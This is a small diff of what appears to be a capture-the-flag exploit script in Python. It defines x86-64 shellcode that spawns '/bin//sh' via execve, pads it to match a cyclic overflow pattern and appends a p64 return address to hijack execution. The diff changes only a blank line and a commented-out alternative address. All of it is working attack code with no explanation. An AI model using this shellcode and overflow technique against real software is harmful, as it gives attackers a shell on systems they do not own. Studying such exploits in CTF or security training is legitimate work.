@@ -14,7 +14,6 @@ afterr = "aaaabaaacaa     eaaafaaagaa     iaaajaaakaa     maaanaaaoaa     qaaara
 
 # 23
 shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
-
 shellcode_list = list()
 
 for i in shellcode:
@@ -37,7 +36,6 @@ while len(shellcode) < len(before):
 print(len(shellcode))
 
 shellcode += p64(0x6010c0)
-# shellcode += p64(0x00000000004007fc)
 
 print(shellcode)
 
